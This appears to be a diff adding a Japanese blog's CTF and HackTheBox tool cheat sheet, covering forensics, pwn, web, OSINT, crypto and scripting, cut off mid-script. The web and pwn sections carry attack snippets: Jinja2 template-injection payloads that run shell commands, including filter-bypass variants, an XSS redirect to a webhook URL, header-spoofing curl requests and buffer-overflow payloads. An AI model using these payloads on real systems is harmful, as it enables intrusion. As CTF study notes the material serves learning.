@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="ja"><script src="/starknote/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=starknote/livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.164.0"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark">
+<link rel="icon" href="/starknote/favicon.ico" type="image/x-icon"><title>📌CTF&HTB Tools まとめ&nbsp;&ndash;&nbsp;しゅたるくの備忘録</title><link rel="stylesheet" href="/starknote/css/core.min.4bf2d65b435be9d2cb342733d6e0d0fe0e915aa1b4daa6665d4eea2be6c09a9d949eb8fb850654c5033c80dda50d8491.css" integrity="sha384-S/LWW0Nb6dLLNCcz1uDQ/g6RWqG02qZmXU7qK&#43;bAmp2Unrj7hQZUxQM8gN2lDYSR"><meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="📌CTF&amp;HTB Tools まとめ" /><meta name="twitter:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/ctf/cover.png" /><meta property="og:type" content="article" />
+<meta property="og:title" content="📌CTF&amp;HTB Tools まとめ" />
+<meta property="og:site_name" content="しゅたるくの備忘録" /><meta property="og:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/ctf/cover.png" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/starknote/"><span class="site name">しゅたるくの備忘録</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/starknote/categories/">カテゴリ</a><a class="nav item" href="/starknote/tags/">タグ</a><a class="nav item" href="/starknote/about/">About</a><a class="nav item" href=""></a></nav></div></span></div></section><section id="content">
+<div id="top" class="article-container"><section class="article header">
+    <h1 class="article title">📌CTF&HTB Tools まとめ</h1><p class="article date">Jan 18, 2026</p></section><article class="article markdown-body"><p>CTFやHTBで利用できるツールを自分用にまとめておく．</p>
+<h2 id="forensics">Forensics</h2>
+<p>参考：
+<a href="https://qiita.com/knqyf263/items/6ebf06e27be7c48aab2e"target="_blank" rel="noopener noreferrer">https://qiita.com/knqyf263/items/6ebf06e27be7c48aab2e</a></p>
+<h3 id="exiftool">exiftool</h3>
+<p>画像や動画のExif情報．</p>
+<pre tabindex="0"><code>$ exiftool image.png
+</code></pre><details><summary>install</summary>
+
+
+
+<figure class="xCodeBlock">
+
+<div class="xCodeBlock_code"><pre tabindex="0"><code>$ sudo apt-get install exiftool</code></pre></div>
+</figure>
+</details>
+<h3 id="pdftotext">pdftotext</h3>
+<p>PDFをテキストに変換．</p>
+<pre tabindex="0"><code>$ pdftotext file.pdf
+$ pdftotext file.pdf -
+</code></pre><ul>
+<li>default：name.txtが作成される</li>
+<li><code>-</code>：標準出力にそのまま出力</li>
+</ul>
+<p>問題例：
+<a href="https://stark2420.github.io/starknote/post/new-year-ctf-2025/#bel_money-part_1-100"target="_blank" rel="noopener noreferrer">https://stark2420.github.io/starknote/post/new-year-ctf-2025/#bel_money-part_1-100</a></p>
+<details><summary>install</summary>
+
+
+
+<figure class="xCodeBlock">
+
+<div class="xCodeBlock_code"><pre tabindex="0"><code>$ apt install poppler-utils
+$ pdftotext -v</code></pre></div>
+</figure>
+</details>
+<h3 id="qrコード">QRコード</h3>
+<ul>
+<li>QRazyBox: <a href="https://merri.cx/qrazybox/"target="_blank" rel="noopener noreferrer">https://merri.cx/qrazybox/</a></li>
+<li>QRコード読み取り: <a href="https://qrcode.onl.jp/"target="_blank" rel="noopener noreferrer">https://qrcode.onl.jp/</a></li>
+</ul>
+
+
+
+<figure class="xCodeBlock">
+<figcaption class="xCodeBlock_title">qr.py</figcaption>
+<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="n">pip</span> <span class="n">install</span> <span class="n">opencv</span><span class="o">-</span><span class="n">python</span>
+</span></span><span class="line"><span class="cl"><span class="err">!</span><span class="n">pip</span> <span class="n">install</span> <span class="n">pyzbar</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cv2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyzbar.pyzbar</span> <span class="kn">import</span> <span class="n">decode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base64_data</span> <span class="o">=</span> <span class="s2">&#34;iVBORw0KGgoAAAANSUhEUgAAAeoAAAHqAQAAAADjFjCXAAAC/klEQVR4nO3aSW7rMAyAYQE+QI7kq/tIPkAAvoSjPHSwlQd08WvRurE+dUNQIpUmI2NpcDgcDofD4fC/xJuPyZ5enzz9k/n1JLK+Plv0xdryBRw+xvUPWV98tqmT+NTH01aLt5N0Ag4f4e+p9m6NyF3e8v1DX2zeTnD4B7nmxk2CfKHloVN9DTj843z1+RGlsV9rDv05aOHwX3P9tcbHOd/Dt06JP+7vcPhvuY9Iht/8iKlw+CDvRh0Gm+3N76f4M0I6J8PhI9yLXLG0GOfAOBbqkpogY7UZDh/lWnhkzWHtljgR1inRD43HVAmHX+de33rN29UmLaUuucRGHgwOv8ut5tDYrK6yZknvvrS2f4LDB3m/GWdY6tR84Zt2LH5MlXD4Vf4QiYUqIlurc2Bt3x7NcPggtzokz4GyRVmgaKieFiNw+FVu7zQZSpwNrecy+/Ldd1mkBhw+wP22rPUZUdZKixXDVRvD4YM8wtAvL7K1PMcaddMWOzccPsg3bbxovERurBjO/wWHf4BHqGr1YbwuOSx9xpJ95QKH3+U+IlRbdf/0KTt9rbW8+IDDB3nFYY5ul7bqVy/UJM+GcPgY9+p3y+veVtYK1Wfu3HD4ED8L2i5V2pMl0v74CIcP8LOgFcm0uOR5sbVqRsPhY3w+01LbsvShWgMO/y/cipFsvFgJvL9Qg8Nv8Nai0tiNJXKjVyTbKXD4fS52eRFt5H5CBGhwHYcKGg6/zuuktx+RGwM9++QKh9/nfaVxMqxAztuPdrK/w+FXuTX05jMZO7eN95SuXobD7/PNtwV245n3trnGsfECh1/m3w8L2mzBdMdHOPw+92iMDbrbqq0Y0QuNR61xuMaFw6/zWX/ZbdnUbcG+Nz9E4n4t8yocPsrrjjY7LZ4Rg+s826DzH8Lhn+DNvoBn3b8WnZY6L9qUL06VcPgtvkmVLj1VKlq9Gf1lzMPhv+YRkTYru8r7YYF8rKDh8Ovcx9SvodyqX536kEykcPg4vzvgcDgcDofD4X+F/wOUtm/WGicMDwAAAABJRU5ErkJggg==&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">image_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;decoded_qr_code.png&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">image_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">image</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s1">&#39;decoded_qr_code.png&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">qr_codes</span> <span class="o">=</span> <span class="n">decode</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">qr</span> <span class="ow">in</span> <span class="n">qr_codes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">qr_data</span> <span class="o">=</span> <span class="n">qr</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">qr_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Happy_New_Year_-_may_it_be_your_best_year_yet!</span></span></span></code></pre></div></div>
+</figure>
+<p>問題例:<br>
+ - <a href="https://stark2420.github.io/starknote/post/new-year-ctf-2025/#broken-qr-100"target="_blank" rel="noopener noreferrer">https://stark2420.github.io/starknote/post/new-year-ctf-2025/#broken-qr-100</a><br>
+ - <a href="https://stark2420.github.io/starknote/post/new-year-ctf-2025/#my-best-regards-100"target="_blank" rel="noopener noreferrer">https://stark2420.github.io/starknote/post/new-year-ctf-2025/#my-best-regards-100</a></p>
+<h2 id="pwn">Pwn</h2>
+<details><summary>install</summary>
+
+
+
+<figure class="xCodeBlock">
+
+<div class="xCodeBlock_code"><pre tabindex="0"><code># pwntoolsのインストール
+$ pip install pwntools
+
+# ROPgadgetのインストール
+$ pip install ROPgadget</code></pre></div>
+</figure>
+</details>
+<h3 id="buffer-overflow-bof">Buffer Overflow (BOF)</h3>
+<h4 id="ローカル変数の書き換え">ローカル変数の書き換え</h4>
+<pre tabindex="0"><code>from pwn import *
+
+io = remote(&#34;localhost&#34;, 9012)
+
+payload = b&#34;A&#34; * 24
+payload += p64(0xdeadbeef)
+
+io.sendline(payload)
+io.interactive()
+</code></pre><h4 id="リターンアドレスの書き替え">リターンアドレスの書き替え</h4>
+<pre tabindex="0"><code>from pwn import *
+
+elf = ELF(&#39;./chall&#39;)
+win_addr = elf.symbols[&#39;win&#39;]
+
+io = remote(&#34;localhost&#34;, 9012)
+
+payload = b&#34;A&#34; * 18
+payload += p64(win_addr)
+
+io.sendafter(b&#34;input:&#34;, payload)
+io.interactive()
+</code></pre><p>手動でwin関数のアドレスを調べる場合は，以下のように<code>0x401186</code>とわかる．</p>
+<pre tabindex="0"><code>$ objdump -d chall | grep &#34;win&#34; -A 16
+0000000000401186 &lt;win&gt;:
+  401186:       55                      push   %rbp
+  401187:       48 89 e5                mov    %rsp,%rbp
+  40118a:       48 83 ec 70             sub    $0x70,%rsp
+  40118e:       48 8d 05 6f 0e 00 00    lea    0xe6f(%rip),%rax        # 402004 &lt;_IO_stdin_used+0x4&gt;
+  401195:       48 89 c6                mov    %rax,%rsi
+  401198:       48 8d 05 67 0e 00 00    lea    0xe67(%rip),%rax        # 402006 &lt;_IO_stdin_used+0x6&gt;
+  40119f:       48 89 c7                mov    %rax,%rdi
+  4011a2:       e8 e9 fe ff ff          call   401090 &lt;fopen@plt&gt;
+  4011a7:       48 89 45 f8             mov    %rax,-0x8(%rbp)
+  4011ab:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  4011af:       48 8d 45 90             lea    -0x70(%rbp),%rax
+  4011b3:       be 64 00 00 00          mov    $0x64,%esi
+  4011b8:       48 89 c7                mov    %rax,%rdi
+  4011bb:       e8 b0 fe ff ff          call   401070 &lt;fgets@plt&gt;
+  4011c0:       48 8d 45 90             lea    -0x70(%rbp),%rax
+  4011c4:       48 89 c7                mov    %rax,%rdi
+</code></pre><h2 id="web">Web</h2>
+<h3 id="ffuf">FFUF</h3>
+<p>WEBファジングツール．</p>
+<pre tabindex="0"><code>$ ffuf -w wordlists.txt -u http://example.com/FUZZ
+$ ffuf -w subdomains.txt -u http://example.com -H &#34;Host:FUZZ.example.com&#34; -c -fs 178
+</code></pre><p><strong>Wordlistsのダウンロード先:</strong></p>
+<ul>
+<li>(公式) <a href="http://ffuf.me/wordlists"target="_blank" rel="noopener noreferrer">http://ffuf.me/wordlists</a></li>
+<li>(ユーザ名) <a href="https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names"target="_blank" rel="noopener noreferrer">https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names</a> [names.txt]</li>
+<li>(シンプルで使いやすい) <a href="https://github.com/Bo0oM/fuzz.txt"target="_blank" rel="noopener noreferrer">https://github.com/Bo0oM/fuzz.txt</a></li>
+<li>(サブドメイン用) <a href="https://wordlists.assetnote.io/"target="_blank" rel="noopener noreferrer">https://wordlists.assetnote.io/</a> [httparchive_subdomains_2024_05_28.txt]</li>
+</ul>
+<p>参考:<br>
+ - <a href="https://jpn.nec.com/cybersecurity/blog/210604/index.html"target="_blank" rel="noopener noreferrer">https://jpn.nec.com/cybersecurity/blog/210604/index.html</a><br>
+ - <a href="https://breezebird.net/ffuf/"target="_blank" rel="noopener noreferrer">https://breezebird.net/ffuf/</a><br>
+ - <a href="https://qiita.com/kk0128/items/5186cbe6062e0f887e3b"target="_blank" rel="noopener noreferrer">https://qiita.com/kk0128/items/5186cbe6062e0f887e3b</a></p>
+<h3 id="git">.git/</h3>
+<p><code>.git/</code>がある場合，<a href="https://github.com/lijiejie/GitHack"target="_blank" rel="noopener noreferrer">GitHack</a> (<a href="https://github.com/lijiejie/GitHack"target="_blank" rel="noopener noreferrer">https://github.com/lijiejie/GitHack</a>) を用いて，ファイルをダウンロードできる．</p>
+<h3 id="curlコマンド">curlコマンド</h3>
+<pre tabindex="0"><code>// 任意のヘッダー（X-Dev-Access: yes）を付与．
+curl -X POST http://amiable-citadel.picoctf.net:61140/login -H &#34;X-Dev-Access: yes&#34; -d email=&#34;ctf-player@picoctf.org&#34;
+
+// -d をJSONで送る場合，Content-Type: application/jsonが必須．
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;email&#34;:&#34;ctf-player@picoctf.org&#34;, &#34;password&#34;:&#34;rCRnekkE&#34;}&#39;
+
+// windowsだと以下にしないとダメ．
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -H &#34;Content-Type: application/json&#34; -d &#34;{\&#34;email\&#34;:\&#34;ctf-player@picoctf.org\&#34;, \&#34;password\&#34;:\&#34;rCRnekkE\&#34;}&#34;
+
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -d email=&#34;ctf-player@picoctf.org&#34; -d password=&#34;rCRnekkE&#34;
+
+// X-Forwarded-ForでIPの偽造が可能？
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -d email=&#34;ctf-player@picoctf.org&#34; -d password=&#34;rCRnekkE&#34; -H &#34;X-Forwarded-For: 127.0.0.1&#34;
+</code></pre><h3 id="urlエンコード">URLエンコード</h3>
+<ul>
+<li><a href="https://tool.hiofd.com/ja/url-hex-online/"target="_blank" rel="noopener noreferrer">https://tool.hiofd.com/ja/url-hex-online/</a></li>
+</ul>
+<p>参考：<a href="https://www.eso.org/~ndelmott/url_encode.html"target="_blank" rel="noopener noreferrer">HTML URL-encoding Reference</a></p>
+<h3 id="文字コード">文字コード</h3>
+<ul>
+<li><a href="https://www.tagindex.com/tool/unicode-code.html"target="_blank" rel="noopener noreferrer">文字 -&gt; Unicode</a></li>
+<li><a href="https://www.tagindex.com/tool/unicode-char.html"target="_blank" rel="noopener noreferrer">Unicode -&gt; 文字</a></li>
+</ul>
+<h3 id="xss">XSS</h3>
+<ul>
+<li><a href="https://webhook.site/"target="_blank" rel="noopener noreferrer">https://webhook.site/</a></li>
+</ul>
+<p>指定のURLにリダイレクトするスクリプト.</p>
+<pre tabindex="0"><code>&lt;script&gt;window.location.href=&#34;https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f&#34;;&lt;/script&gt;
+</code></pre><h3 id="sstiserver-side-template-injection">SSTI(Server-Side Template Injection)</h3>
+<ul>
+<li>判別チートシート <a href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png"target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png</a></li>
+<li>ninja (flaskのrender_template_stringは内部でninja使用)
+<ul>
+<li><code>{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}</code></li>
+<li>（「.」が使用できない場合）<code>{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}</code></li>
+<li>（「.」「_」が使用できない場合）<code>{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}</code></li>
+<li>（「.」「_」「[]」が使用できない場合）<code>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}</code></li>
+</ul>
+</li>
+</ul>
+<p>参考：<br>
+ - <a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/"target="_blank" rel="noopener noreferrer">https://onsecurity.io/article/server-side-template-injection-with-jinja2/</a><br>
+ - <a href="https://blog.hamayanhamayan.com/entry/2021/12/15/225142"target="_blank" rel="noopener noreferrer">CTFのWebセキュリティにおけるSSTIまとめ</a></p>
+<h3 id="探索">探索</h3>
+<ul>
+<li>ソースコードのコメント</li>
+<li>リスポンスヘッダー</li>
+<li>robots.txt</li>
+<li>robots.txtのDisallowに指定されたディレクトリ</li>
+<li>ソースマップ（.mapの拡張子で終わるJSONのファイル）<code>app.js.map</code></li>
+<li>Cookie</li>
+<li>Cookieの<code>user:guest</code>を<code>user:admin</code>にする</li>
+<li>Cookieの<code>admin:False</code>を<code>admin:True</code>にする</li>
+<li>.htaccess</li>
+<li>.DS_Store</li>
+</ul>
+<h2 id="osint">Osint</h2>
+<h3 id="検索方法">検索方法</h3>
+<ul>
+<li>&quot;&quot; で囲むと必須検索になる</li>
+<li>検索の期間指定で「何日以前のみ」の検索も可</li>
+</ul>
+<h3 id="国立国会図書館デジタルコレクション">国立国会図書館デジタルコレクション</h3>
+<p>古い画像などの検索．</p>
+<ul>
+<li><a href="https://dl.ndl.go.jp/"target="_blank" rel="noopener noreferrer">https://dl.ndl.go.jp/</a></li>
+</ul>
+<h3 id="ウェブアーカイブ">ウェブアーカイブ</h3>
+<ul>
+<li><a href="https://web.archive.org/"target="_blank" rel="noopener noreferrer">https://web.archive.org/</a></li>
+<li><a href="https://archive.md/"target="_blank" rel="noopener noreferrer">https://archive.md/</a></li>
+</ul>
+<h3 id="whois検索ドメイン取得日など">WHOIS検索(ドメイン取得日など)</h3>
+<ul>
+<li><a href="https://tech-unlimited.com/whois.html"target="_blank" rel="noopener noreferrer">https://tech-unlimited.com/whois.html</a></li>
+</ul>
+<h3 id="ホスティングサービス">ホスティングサービス</h3>
+<ul>
+<li>DNSで「正引き」と「逆引き」を行う．</li>
+</ul>
+<pre tabindex="0"><code>$ nslookup www.example.com
+Server:         10.255.255.254
+Address:        10.255.255.254#53
+
+Non-authoritative answer:
+Name:   www.example.com
+Address: 104.18.26.120
+
+$ nslookup 104.18.26.120
+</code></pre><h3 id="11foot8">11foot8</h3>
+<p>この鉄道橋は，高さ制限が低いため，多くのトラックが屋根を削られる事故が起きたことで有名になり，専用のウェブサイトが運営されているらしい．</p>
+<ul>
+<li><a href="https://11foot8.com/about/the-documentary/"target="_blank" rel="noopener noreferrer">https://11foot8.com/about/the-documentary/</a></li>
+</ul>
+<h3 id="google-earth">Google Earth</h3>
+<ul>
+<li>過去の航空写真を利用できる</li>
+<li>撮影日時もわかる</li>
+</ul>
+<h3 id="gmailアドレス">Gmailアドレス</h3>
+<p>Googleカレンダーの情報などが得られる．</p>
+<ul>
+<li><a href="https://epieos.com/"target="_blank" rel="noopener noreferrer">https://epieos.com/</a></li>
+</ul>
+<h2 id="crypto">Crypto</h2>
+<h3 id="何の暗号かを調べる">何の暗号かを調べる</h3>
+<ul>
+<li><a href="https://www.dcode.fr/cipher-identifier"target="_blank" rel="noopener noreferrer">https://www.dcode.fr/cipher-identifier</a></li>
+</ul>
+<h3 id="国際信号旗">国際信号旗</h3>
+<ul>
+<li><a href="https://ja.wikipedia.org/wiki/%E5%9B%BD%E9%9A%9B%E4%BF%A1%E5%8F%B7%E6%97%97"target="_blank" rel="noopener noreferrer">https://ja.wikipedia.org/wiki/%E5%9B%BD%E9%9A%9B%E4%BF%A1%E5%8F%B7%E6%97%97</a></li>
+</ul>
+<p>　例題：
+<a href="https://qiita.com/samohan/items/412e62a7c981e1c20ea2"target="_blank" rel="noopener noreferrer">https://qiita.com/samohan/items/412e62a7c981e1c20ea2</a></p>
+<h3 id="burrows-wheeler変換-bwtブロックソート">Burrows-Wheeler変換 (BWT)，ブロックソート</h3>
+<p><a href="https://www.dcode.fr/burrows-wheeler-transform"target="_blank" rel="noopener noreferrer">https://www.dcode.fr/burrows-wheeler-transform</a></p>
+<p>　例題：
+<a href="https://stark2420.github.io/starknote/post/uoftctf-2025/#funny-cipher-100"target="_blank" rel="noopener noreferrer">https://stark2420.github.io/starknote/post/uoftctf-2025/#funny-cipher-100</a></p>
+<h3 id="モールス信号">モールス信号</h3>
+<ul>
+<li><a href="https://morsedecoder.com/"target="_blank" rel="noopener noreferrer">https://morsedecoder.com/</a></li>
+<li><a href="https://www.morsecode-translator.com/ja"target="_blank" rel="noopener noreferrer">https://www.morsecode-translator.com/ja</a></li>
+<li>(音声も復号) <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html"target="_blank" rel="noopener noreferrer">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a></li>
+</ul>
+<h3 id="シーザー暗号">シーザー暗号</h3>
+<ul>
+<li><a href="http://www.net.c.dendai.ac.jp/crypto/caesar2.html"target="_blank" rel="noopener noreferrer">http://www.net.c.dendai.ac.jp/crypto/caesar2.html</a></li>
+</ul>
+<h3 id="単一換字式暗号">単一換字式暗号</h3>
+<ul>
+<li><a href="https://quipqiup.com/"target="_blank" rel="noopener noreferrer">https://quipqiup.com/</a></li>
+</ul>
+<h3 id="ビジュネル暗号">ビジュネル暗号</h3>
+<ul>
+<li><a href="https://www.guballa.de/vigenere-solver"target="_blank" rel="noopener noreferrer">https://www.guballa.de/vigenere-solver</a> (鍵も推測する)</li>
+<li><a href="https://www.dcode.fr/chiffre-vigenere"target="_blank" rel="noopener noreferrer">https://www.dcode.fr/chiffre-vigenere</a> (鍵も推測する)</li>
+<li><a href="https://cryptii.com/pipes/vigenere-cipher"target="_blank" rel="noopener noreferrer">https://cryptii.com/pipes/vigenere-cipher</a></li>
+</ul>
+<h3 id="素因数分解">素因数分解</h3>
+<ul>
+<li><a href="http://factordb.com/"target="_blank" rel="noopener noreferrer">http://factordb.com/</a> (既知のNを分解)</li>
+<li><a href="https://www.alpertron.com.ar/ECM.HTM"target="_blank" rel="noopener noreferrer">https://www.alpertron.com.ar/ECM.HTM</a></li>
+</ul>
+<h3 id="cyberchef">CyberChef</h3>
+<ul>
+<li><a href="https://gchq.github.io/CyberChef/"target="_blank" rel="noopener noreferrer">https://gchq.github.io/CyberChef/</a></li>
+</ul>
+<h3 id="ハッシュ値">ハッシュ値</h3>
+<ul>
+<li><a href="https://crackstation.net/"target="_blank" rel="noopener noreferrer">https://crackstation.net/</a> (Free Password Hash Cracker)</li>
+</ul>
+<h3 id="脆弱なrsa暗号">脆弱なRSA暗号</h3>
+<ul>
+<li>(RSA暗号でやってはいけない $n$ のこと) <a href="https://www.slideshare.net/slideshow/rsa-n-ssmjp/72368516#1"target="_blank" rel="noopener noreferrer">https://www.slideshare.net/slideshow/rsa-n-ssmjp/72368516#1</a></li>
+<li>$N$ が既知で，暗号化オラクルあり，平文が既知で暗号文を求める場合</li>
+<li>$N$ が未知で，暗号化オラクルあり，平文が既知で暗号文を求める場合</li>
+</ul>
+<p>参考：
+<a href="https://zenn.dev/asusn/articles/6bb19c694e94ce#%E6%B1%8E%E7%94%A8%E3%83%84%E3%83%BC%E3%83%AB"target="_blank" rel="noopener noreferrer">https://zenn.dev/asusn/articles/6bb19c694e94ce#%E6%B1%8E%E7%94%A8%E3%83%84%E3%83%BC%E3%83%AB</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="err">!</span><span class="n">pip</span> <span class="n">install</span> <span class="n">pycryptodome</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="mi">33091</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">10952625052656831515204538182703136388328319215692561827776703217129125920630092954719731657697359076607720006975422546048557875675403691541340687683615299</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="c1"># or m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#39;big&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></div><h2 id="misc">Misc</h2>
+<h3 id="ターミナルの入出力の自動化">ターミナルの入出力の自動化</h3>
+<ul>
+<li>一行ずつ読み取る場合：<code>p.recvline()</code></li>
+</ul>
+<pre tabindex="0"><code>$ nc 127.0.0.1 4649
+Add and answer in decimal.
+0x1a87
+0b1010100001100
+0o6221
+0o4054
+0xae2
+answer: 
+</code></pre>
+
+
+<figure class="xCodeBlock">
+<figcaption class="xCodeBlock_title">Solver.py</figcaption>
+<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># p = process([&#34;python&#34;, &#34;main.py&#34;])　# ローカルでプログラムを実行</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">4649</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">numbers</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">sum</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span> <span class="c1"># 一行取得，改行削除，byte列 -&gt; 文字列 </span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">numbers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="s1">&#39;^0b&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
